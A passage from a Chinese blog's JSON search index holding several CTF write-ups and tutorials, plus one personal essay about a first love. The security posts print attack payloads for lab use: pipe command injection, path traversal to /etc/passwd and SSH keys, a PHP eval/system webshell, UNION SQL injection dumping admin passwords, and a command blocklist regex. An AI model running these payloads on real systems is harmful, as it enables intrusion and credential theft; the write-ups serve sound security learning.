127.0.0.1，有结果\n\n使用linux管道符查看目录\n127.0.0.1|ls\n\n\n当前目录为index.php，没有发现flag文件。\n0x04既然没有flag.php文件，就要尝试看看有没有flag.txt文件，使用linux命令find查找文件：\n127.0.0.1|find &#x2F; -name &#39;*.txt&#39;\n\n看到有flag.txt文件。\n\n0x05打开flag.txt文件\n127.0.0.1|cat &#x2F;home&#x2F;flag.txt\n\n\n0x06这个题主要是注意当前目录中没有相关的php文件要想到txt文件。\n所涉及知识点：\nLinux find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示\n","slug":"攻防世界-web-command-execution","date":"2022-05-09T08:49:25.000Z","categories_index":"RCE","tags_index":"RCE","author_index":"Aurora"},{"id":"2659211fc1b4543131f8cda1813d3bae","title":"关于她","content":"写一篇关于她时隔久远没更博了，种种原因实在没时间。\n​        想写一篇关于她，之前就想写了，一直不知道该怎么写，直到今天，我昨晚又梦到她了。虽然经常会梦到她，但这次也许感情更加浓烈。关于她，也就随便聊聊，自己想把自己心里压了很久的话写在这里。关于她，我只想用一句网络流行语来形容：我喜欢别人怀里的女孩，就是她。\n​       关于她，应该追溯到我上初中时期的事情了。她，我情窦初开第一个喜欢的女孩，那时的我便每天迷恋着她，当时还和她坐着同桌，那时候的我就开始追求人家，虽然没有表现的很明显，也是因为有很多顾虑，她在班里学习成绩一直名列前茅，一直害怕耽误她的学习；但我当时并不比她差，也正是如此，后来我的成绩严重下滑，最后把自己搞得很狼狈，我当时的发小了解情况之后很生气就来质问我：”她就这么吸引你吗？看看你自己变成什么样子了，她长得很倾国倾城吗？“后来我告诉我发小，她吸引我的地方并不是她的外貌，虽然她并不是很漂亮，但她最吸引我的地方是她身上的气质，她身上的魅力，网红不比她更漂亮吗？但对我来说网红什么都不是。后来有一段时间，我发现我已经控制不住自己了，开始变得颓废，不再是以前那个我了，开始随心所欲，再也没有在乎过成绩的好坏。果然，不出所料，中考那年，她去了全市最好的高中，而我只能末流学校；上了高中，我以为我已经放下了，毕竟嘛，一个女人而已，有什么大不了的，当时就开始物色高中的女孩决定要开始另一段感情了。在这里我想对自己说一句：你就是个废物垃圾。如果演电影时候都不需要你怎么去模仿演废物，你直接本色出演。和高中的一个简简单单谈了半年，一开始还很正常，可到了第三个月，我发现我和现在这个女孩在一起的时候心里总会去想她，以至于对当时那个女孩再也没有了一点感觉，从那时开始，夜里做梦总会梦到她，她就像是有魔力一样，总是把控着我的内心，我那时才发现，初中喜欢了她两年，那两年时间真正的把她放在了心底，无论是谁也撼动不了的地位。我发现我还是那么喜欢她，偶尔想起来她心里还是会笑，我总会骂自己你可真贱啊。上了高中以后我再也没有联系过她，只有她的联系方式，每天都会习惯性的去翻翻她的朋友圈，看看她的动态给她点点赞，就这么看着，从不说一句话。我的微信喜欢删除那些从来不说话的人，或者一些只是认识而已的人，包括很多初中时的一些同学大部分都被我删了，我也忘了为什么把他们删了，或许是忘了改变备注，又或许是别的原因。但是她，我从来没想过，就算把我列表里所有人都删了我也不会删了她。不管时间过了多久，我发现我对她的喜欢从来都没有变过，尽管现在大学了，她的变化倒是出乎我的意料，以前我认识的她是不抽烟的，后来我发现她开始抽烟了，不过这些都不重要，同样改变不了我对她的喜欢，我总觉得我对她有别样得情愫。我认识她的时候是她最纯粹的时候，那才是真正的她，尽管后来她变了，但她内心最纯粹的自己我相信永远都不会变，变得只是别人看达到的她。我还记得当时QQ有一个功能是匿名留言，可以把最最想说的话匿名发给她，我当时脑子一热给她发了一句：如果以后你未嫁，我未婚，我一定会娶你。哈哈哈，想想当时的自己多幼稚。自从上了高中，我把就把QQ注销了，我的QQ私密空间里存了很多她当时照片，现在都没了。我记得初中时候有一个假期，我把她的照片做成了小视频，还写了对她表白的话，当时已经晚上2点多了，我做完之后困得睁不开眼，想着做完之后存为私密状态，谁知第二天打开一看，全部可见，当时评论都疯了，尴尬的我想抠出个三室一厅来，我立马就是删除。之后我更是不敢和她说话，不敢去看她，我也知道正是中考关键时期，我也不敢去打扰她。后来也就没有后来了。现在的我有时候还会想，我以后还可以再遇到她吗，会以什么样的方式遇见她，我遇见她的时候她会带着她的男朋友吗。或许，没有以后了。以后我也不知道我还会不会像喜欢你一样去喜欢另一个不是你的女孩，但我知道，不管是谁都替代不了你。\n​        我这辈子最大的遗憾，就是当时没有和她好好说一句：我喜欢你!\n​        关于她，我有很多很多说不出的心酸苦楚，无奈悲痛。我会一直把你心里，直到我真的不想再去想你的那一天。\n","slug":"关于她","date":"2022-04-24T03:40:04.000Z","categories_index":"她","tags_index":"她","author_index":"Aurora"},{"id":"6e204dcc81a1dda57afcdf13b8c27892","title":"文件操作-文件下载及读取","content":"前言脑图：\n漏洞原理文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）\n任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本代码，服务器配置或者是系统配置等等。但是有的时候我们可能根本不知道网站所处的环境，以及网站的路径，这时候我们只能利用.&#x2F; ..&#x2F;来逐层猜测路径，让漏洞利用变得繁琐。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 \n如下代码一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字，将存在任意文件下载漏洞。\n&lt;?php\n  $filename &#x3D; $_GET[&#39;filename&#39;];\n  echo &#39;&lt;h1&gt;讲开始下载文件！&lt;&#x2F;h1&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&#39;;\n  echo **file_get_contents**($filename); &#x2F;&#x2F;**无过滤导致*****\\*漏洞函数\\**** **file_get_contents 函数把整个文件读入一个字符串中并输出**\n\n  header(&#39;Content-Type: imgage&#x2F;jpeg&#39;);\n  header(&#39;Content-Disposition: attachment; filename&#x3D;&#39;.$filename);\n  header(&#39;Content-Lengh: &#39;.filesize($filename));\n?&gt;\n\n\n\n漏洞发现如何发现（网站URL中存在下载参数，并且未进行过滤..&#x2F;..&#x2F;..&#x2F;字符，且输出了文件内容）1、Google search利用inurl:”readfile.php?file&#x3D;”\n2、从链接上看，形如：  • download.php?path&#x3D;  • download.php?file&#x3D;  • down.php?file&#x3D;  • data.php?file&#x3D;  • readfile.php?file&#x3D;  • read.php?filename&#x3D;\n3、从参数名看，形如：  • &amp;RealPath&#x3D;  • &amp;FilePath&#x3D;  • &amp;ﬁlepath&#x3D;  • &amp;Filepath&#x3D;  • &amp;Path&#x3D;  • &amp;path&#x3D;  • &amp;inputFile&#x3D;  • &amp;Inputfile&#x3D;  • &amp;url&#x3D;  • &amp;urls&#x3D;  • &amp;Lang&#x3D;  • &amp;dis&#x3D;  • &amp;data&#x3D;  • &amp;Data&#x3D;  • &amp;readﬁle&#x3D;  • &amp;ﬁlep&#x3D;  • &amp;src&#x3D;  • &amp;menu&#x3D;  • META-INF  • WEB-INF\n4、index.php?f&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd\n index.php?f&#x3D;..&#x2F;index.php\n index.php?f&#x3D;ﬁle:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd\n readfile.php?file&#x3D;&#x2F;etc&#x2F;passwd\n readfile.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd\n readfile.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00（00截断）\n5、使用扫描工具扫描敏感文件，如：\n​      御剑，7kb等等\n6、利用下载好的文件代码去分析路径和包含文件获取敏感文件等\n7、真实网站需要找到下载功能点，分析是什么脚本及下载路径选择对应下载文件\n（注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，\n  若显示源码或提示下载则是文件查看与下载漏洞）\n漏洞绕过1.若过滤字符或字母可尝试编码绕过\n2.利用 ..&#x2F;..&#x2F;\n但是有些代码会进行过滤(具体要根据代码进行测试)，会把 ..&#x2F; 置空利用….&#x2F;&#x2F; 代替 ..&#x2F;利用..&#x2F;&#x2F; 代替 &#x2F;\n具体怎么绕过还是得看代码是怎么写的3.\n注意①.注意 ..&#x2F; 的数量，他代表查询目录父目录的数量②.当我们遇到一个任意文件下载漏洞时首先要注意下载的权限问题。因为权限决定我们能下载的文件范围。③.有些网站（主要是针对系统）并不会在URL里显示给你看，这时候你需要抓包，从数据包里修改路径，达到任意文件读取。\n漏洞利用**利用:**（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件&#x2F;代码文件 &gt;&gt; 利用服务器软件漏洞&gt; shell&gt; 提权）1.任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。\n2.下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器\n3.Windows：（windows的这些路径不一定都存在）\n  C:\\boot.ini &#x2F;&#x2F;查看系统版本\n  C:\\Windows\\System32\\inetsrv\\MetaBase.xml     &#x2F;&#x2F;IIS配置文件\n  C:\\Windows\\repair\\sam                     &#x2F;&#x2F;存储系统初次安装的密码\n  C:\\Program Files\\mysql\\my.ini                &#x2F;&#x2F;Mysql配置\n  C:\\Program Files\\mysql\\data\\mysql\\user.MYD   &#x2F;&#x2F;Mysql root\n  C:\\Windows\\php.ini        &#x2F;&#x2F;php配置信息\n  C:\\Windows\\my.ini        &#x2F;&#x2F;Mysql配置信息\n  C:\\Windows\\win.ini        &#x2F;&#x2F;Windows系统的一个基本系统配置文件\nLinux：\n  &#x2F;root&#x2F;.ssh&#x2F;authorized_keys\n  &#x2F;root&#x2F;.ssh&#x2F;id_rsa\n  &#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore\n  &#x2F;root&#x2F;.ssh&#x2F;known_hosts        &#x2F;&#x2F;记录每个访问计算机用户的公钥\n  &#x2F;etc&#x2F;passwd\n  &#x2F;etc&#x2F;shadow\n  &#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini         &#x2F;&#x2F;PHP配置文件\n  &#x2F;etc&#x2F;my.cnf          &#x2F;&#x2F;mysql配置文件\n  &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf        &#x2F;&#x2F;apache配置文件\n  &#x2F;root&#x2F;.bash_history        &#x2F;&#x2F;用户历史命令记录文件\n  &#x2F;root&#x2F;.mysql_history        &#x2F;&#x2F;mysql历史命令记录文件\n  &#x2F;proc&#x2F;mounts          &#x2F;&#x2F;记录系统挂载设备\n  &#x2F;porc&#x2F;config.gz         &#x2F;&#x2F;内核配置文件\n  &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db      &#x2F;&#x2F;全文件路径\n  &#x2F;porc&#x2F;self&#x2F;cmdline        &#x2F;&#x2F;当前进程的cmdline参数\n漏洞防护\n过滤.(点)，使用户在url中不能回溯上级目录\n正则严格判断用户输入参数的格式\nphp.ini配置open_basedir限定文件访问范围\n\n转载原文：https://www.cnblogs.com/zzhoo/p/12613815.html\nJavaweb实现文件下载：\nhttps://blog.csdn.net/Cheng_May/article/details/78600833\n小米路由器远程任意文件下载：https://www.seebug.org/vuldb/ssvid-98122\n","slug":"文件操作-文件下载及读取","date":"2022-03-20T12:38:50.000Z","categories_index":"任意文件下载","tags_index":"任意文件下载","author_index":"Aurora"},{"id":"7b77b3ea2f4278aa34c51c9c5ad0efd9","title":"文件操作-文件包含漏洞","content":"前言脑图：\n文件包含服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页面需要更新时，只更新一个包含文件就可以了，或者向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。\n文件包含涉及函数require()函数：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本\n\ninclude()函数：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行\n\ninclude_once()函数：若文件中代码已被包含则不会再次包含\n\nrequire_once()函数：若文件中代码已被包含则不会再次包含\n\n\n\n漏洞原理文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。\n例：\n&lt;?php\n    $filename = $_GET['file'];\n    include($filename);\n?>\n\n假如网站中有phpinfo.php文件，攻击者可以构造?file=phpinfo.php的payload进行读取敏感文件。\n漏洞检测1、白盒：进行代码审计\n2、黑盒：漏扫工具，公开漏洞，手工看参数值及功能点\n漏洞类型1、本地文件包含（读取本地的敏感文件）file://C:\\Windows\\System32\\drivers\\etc\\hosts 本地DNS存在file://D:\\software\\phpStudy\\PHPTutorial\\php\\php-5.4.45\\php.ini php的配置文件file://D:\\software\\phpStudy\\PHPTutorial\\Apache\\conf\\httpd.conf http的配置文件file://D:\\software\\phpStudy\\PHPTutorial\\MySQL\\my.ini 数据库的配置文件\n当本地包含有限制的情况下常用绕过姿势：1、%00截断：\n条件：magic_quotes_gpc&#x3D;Off，php版本&lt;5.3.4\nfilename&#x3D;..&#x2F;..&#x2F;..&#x2F;xxx.txt\n2、长度截断：\n条件：windows，点号（.）需要长于256；linux长于4096\n（相当于垃圾数据填充；由于命名过长会导致有限制的后缀名加不上来，导致绕过限制）\n2、远程文件包含一般情况下，远程文件包含的都是TXT文件，可以直接使用远程文件包含包含一句话木马，或者利用文件包含写入一句话木马(单引号)必须开启php.ini中的allow_url_include才能使用远程包含http://IP地址/文件名\n远程包含有限制基本绕过姿势：\n1、加%20\n2、加%23\n3、？\n4、……\n伪协议\n参考文章：https://blog.csdn.net/DARKNOTES/article/details/118660183\nhttps://www.cnblogs.com/endust/p/11804767.html\n","slug":"文件操作-文件包含漏洞","date":"2022-03-20T09:52:07.000Z","categories_index":"文件包含","tags_index":"文件包含","author_index":"Aurora"},{"id":"5e40bb5a83b8a3c2081bbb8071845ea4","title":"BUU-Crypto-看我回旋踢","content":"前言记一次BUU密码学的CTF题目：看我回旋踢。不是很擅长密码学这一个方向，简单记录一下，毕竟计算机最后都不分家嘛。\n0x00 启动靶场启动靶场下载压缩包，解压得到一串字符串\n\n\n0x01synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;\n首先看到会很懵，不知道这是什么编码，直接使用搜索引擎搜索synt编码会出现rot13的字样，再去搜索rot13会发现这是rot13编码。\n0x02使用在线解密工具：http://www.rot13.de/index.php\n\n将字符串解密得到flag。\n0x03 ROT13编码ROT13（回转13位，rotate by 13 places，有时中间加了个连字符称作ROT-13）是一种简易的替换式密码。\nROT13被描述成“杂志字谜上下颠倒解答的Usenet点对点体”。ROT13 也是过去在古罗马开发的凯撒加密的一种变体。\n特点：\n套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母， 有需要超过时则重新绕回26英文字母开头即可。\nROT13函数是它自己的逆反：\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\nNOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm\n","slug":"BUU-Crypto-看我回旋踢","date":"2022-03-19T14:10:12.000Z","categories_index":"CTF","tags_index":"CTF,Crypto","author_index":"Aurora"},{"id":"c1f68926e47c7ff28424379bdd26999e","title":"BUU-UPLOAD联合RCE","content":"前言BUU一道文件上传联合RCE的一道题。\n0x00 启动靶场启动靶场提示上传文件，随便上传一个1.php文件，写入一句话，发现并没有做限制，可以任意文件上传，但上传之后会将文件名和后缀名修改为xxx.jpg的格式。\n\n\n看到回显的路径。\n试着访问，是空白页面，不知道是否能被执行。\n上传一个2.php，里面写入Hello World!看看效果\n&lt;?php echo &#39;Hello World!&#39;; ?&gt;\n\n\n可以看到文件被执行成功了，那么1.php也可以被执行成功。\n（我们上传之后 不能直接访问xxx&#x2F;uploads&#x2F;xxxxx.jpg 那样只是预览这个文件 而起不到调用这个文件的作用）\n0x02但是使用蚁剑链接后可以连接成功，但是不能连接到文件目录\n\n0x03最后翻了几篇帖子，发现需要和RCE漏洞一起执行。\n首先需要将一句话木马修改一下：\n&lt;?php @eval(system($_POST[&quot;x&quot;]));?&gt;\n\n注：这里使用system()函数的原因：（这也是为什么会联合RCE一起的原因）\n\n0x04最后将修改的1.php文件上传并访问（这里同样访问后是空白），但经过上面的测试可以知道上传的文件已经被执行成功。\n\n0x05接着将url放入到Postman中访问，并把Body的值修改为x:ls /，可以得到网站目录\n\n再修改为x:cat /flag，得到flag\n\n0x06 总结这道题最主要的就是要知道虽然可以进行任意文件上传，但上传后的文件名和后缀名都被会重新修改，导致菜刀或者蚁剑可以连接成功，但不能够访问网站目录；其次就是要知道直接访问xxx.jpg文件只是去预览这个文件，而不是去调用这个文件，导致一句话不能被执行而失去作用，这个时候使用工Postman修改Body中参数，加入命令找到flag。\n","slug":"BUU-UPLOAD联合RCE","date":"2022-03-18T09:32:48.000Z","categories_index":"CTF","tags_index":"CTF,RCE,文件上传","author_index":"Aurora"},{"id":"eefdee94a2ec4b5d372ab4adce8d3bac","title":"BUU-BURP-X-Real-IP","content":"前言BUU一道BURP的题目，并记录一下X-Forwarded-For和X-Real-IP的区别。\n0x00 启动靶场看到只能本地访问，一般看到这句话的时候肯定首先想到的是X-Forwarded-For，但是数据包中加了X-Forwarded-For也没什么作用，翻了几篇帖子看到需要用到X-Real-IP。\n\n0x01在数据包中加入X-Real-IP：127.0.0.1，看到有登录页面：\n0x02接着点击登录即可获得flag：\n\n0x03 两者区别1、X-Forwarded-For：用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中\n2、X-Real-IP：一般只记录真实发出请求的客户端IP\n0x04 总结了解X-Forwarded-For和X-Real-IP的区别；并且在本题中加入X-Forwarded-For同样也会把请求来源的IP追加在后面，导致请求的时候并不是使用127.0.0.1进行访问，这也是为什么X-Forwarded-For不能成功的原因，而使用X-Real-IP时，后台在检测的时候便是真实的127.0.0.1在访问。\n","slug":"BUU-BURP-X-Real-IP","date":"2022-03-18T08:10:44.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"Aurora"},{"id":"61025c4bc325a8f722ff6e7c3ae2291b","title":"BUU-SQL注入-寻找注入点","content":"前言记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。\n0x00 启动靶场启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。\n\n\n0x01 信息搜集登录页面无果后，测试了热点页面，有三篇新闻，随便开一片后发现url的值在变化：\n\n\n接着查看源码：\n\n发现content_detail.php这里也有字段的变化，并且和url的content值相对应，那在这里就能大胆的猜测，content字段这里存在注入点。\n0x02 判断字段数既然探测出了 注入点，那接下来就需要判断字段数：\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 3\n\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 2\n\n\n当判断字段数为3时无回显，字段数为2时，回显正常页面，那这里字段数就是2.\n0x03 判断回显点使用联合注入判断回显点：\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,2\n\n\n0x04 后续操作爆库：\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(schema_name) from information_schema.schemata\n\n\n爆表：\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()\n\n\n爆字段：\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;FLAG_TABLE&#39;\n\n\n爆内容：\nhttp:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select group_concat(username),group_concat(password) from admin\n\n\n注：这里得到了管理员的账号和密码，在登录页面输入账号密码得到flag\n\n0x05 总结这道题最主要的难点在于寻找注入点，找到注入点之后，后续操作也就水到渠成了；其次就是信息搜集的重要性，若不花时间去信息搜集，在测试过程中往往很难继续往下进行。\n","slug":"BUU-SQL注入-寻找注入点","date":"2022-03-18T02:49:56.000Z","categories_index":"SQL注入","tags_index":"CTF,SQL注入","author_index":"Aurora"},{"id":"8ced8e9ea7483c651973016447b0e3bf","title":"东塔靶场-CTF-命令执行_2","content":"前言东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。\n0x00打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过\n\n查看源码，最可疑的是这张图片的地址，base64加密\n\n先解码，得到是dota.png这张图片\n\n0x01先将url解码试试\n解码前：TmpRMlpqYzBOakV5WlRjd05tVTJOdz09\n解码后：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;\n\n解码后又是一个base64，再进行解码\n解码前：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;\n解码后：646f74612e706e67\n\n看着像16进制编码后的结果，试试16进制解码\n解码前：646f74612e706e67\n解码后：dota.png\n\n解码完之后是dotd.png这张图片。\n那这里的逻辑应该是这样的：\ndota.png这张图片被三次编码之后放入地址栏中被解析成一张图片，结合上面将源码中的图片地址进行base64解码之后得到的正好是dota.png,那这里就不难理解了：url中将图片三次编码后，最后又被解析成了源码中的链接；而这里我们正好需要知道源码，那将index.php逆向的进行编码然后放入地址栏中，源码中就会出现index.php的源码链接，解码之后就是源码。\n\n\n\n0x02将index.php进行逆向三次加密\n十六进制：696e6465782e706870\n第一次base64加密：Njk2ZTY0NjU3ODJlNzA2ODcw\n第二次base64加密：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3\n\n 然后将最终编码后的index.php放入地址栏中进行解析\n\n打开源码，复制index.php的链接进行base64解码\n\n得到源代码\n\n0x03将源码复制出来，进行代码审计\n&lt;!DOCTYPE html&gt;\n&lt;!--[if lt IE 7]&gt; &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8 lt-ie7&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 7]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 8]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;\n&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html class&#x3D;&quot;no-js&quot; lang&#x3D;&quot;en&quot;&gt; &lt;!--&lt;![endif]--&gt;\n&lt;head&gt;\n  &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;\n  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width&quot; &#x2F;&gt;\n  &lt;title&gt;dongta xueyuan&lt;&#x2F;title&gt;  \n  &lt;!-- Included CSS Files (Uncompressed) --&gt;\n  &lt;!--\n  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;stylesheets&#x2F;foundation.css&quot;&gt;\n  --&gt;  \n  &lt;!-- Included CSS Files (Compressed) --&gt;\n \n  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;foundation.min.css&quot;&gt;\n  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;app.css&quot;&gt;\n  &lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;.&#x2F;dt.png&quot; type&#x3D;&quot;image&#x2F;x-icon&quot;&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;modernizr.foundation.js&quot;&gt;&lt;&#x2F;script&gt;\n  &lt;!-- IE Fix for HTML5 Tags --&gt;\n  &lt;!--[if lt IE 9]&gt;\n    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;html5shiv.googlecode.com&#x2F;svn&#x2F;trunk&#x2F;html5.js&quot;&gt;&lt;&#x2F;script&gt;\n  &lt;![endif]--&gt;\n  &lt;link href&#x3D;&#39;http:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;Open+Sans&#39; rel&#x3D;&#39;stylesheet&#39; type&#x3D;&#39;text&#x2F;css&#39;&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;div class&#x3D;&quot;row&quot;&gt;\n\t&lt;div class&#x3D;&quot;four columns centered&quot;&gt;\n\t\t&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;img src&#x3D;&quot;images&#x2F;dota.png&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;p&gt;\n\t\t&lt;fieldset&gt;\n\t\t &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;\n        .org12\n        &#123;\n            color: #f60;\n        &#125;\n        .grey12\n        &#123;\n            color: #989898;\n        &#125;\n    &lt;&#x2F;style&gt;\n\n \n\n&lt;font class&#x3D;&quot;org12&quot;&gt;★★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;&lt;&#x2F;font&gt;\n\t\t\t&lt;legend&gt;Details&lt;&#x2F;legend&gt;\n&lt;?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);\n$cmd &#x3D; $_GET[&#39;cmd&#39;];\nif (!isset($_GET[&#39;tup&#39;]) || !isset($_GET[&#39;cmd&#39;])) \n    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?tup&#x3D;TmpRMlpqYzBOakV5WlRjd05tVTJOdz09&amp;cmd&#x3D;&#39;);\n$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;tup&#39;])));\n\n$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);\nif (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;\n    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;\n    die(&quot;这里没有flag&quot;);\n&#125; else &#123;\n    $txt &#x3D; base64_encode(file_get_contents($file));\n    echo &quot;&lt;br&#x2F;&gt;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;\n    echo &quot;&lt;br&gt;&quot;;\n&#125;\necho $cmd;\necho &quot;&lt;br&gt;&quot;;\nif (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;\n    echo(&quot;forbid ~&quot;);\n    echo &quot;&lt;br&gt;&quot;;\n&#125; else &#123;\n    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;\n        echo &#96;$cmd&#96;;\n    &#125; else &#123;\n        echo (&quot;有趣的md5&quot;);\n    &#125;\n&#125;\n\n?&gt;\n\n&lt;&#x2F;div&gt;  \n  &lt;!-- Included JS Files (Uncompressed) --&gt;\n  &lt;!--  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.mediaQueryToggle.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.forms.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.reveal.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.orbit.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script 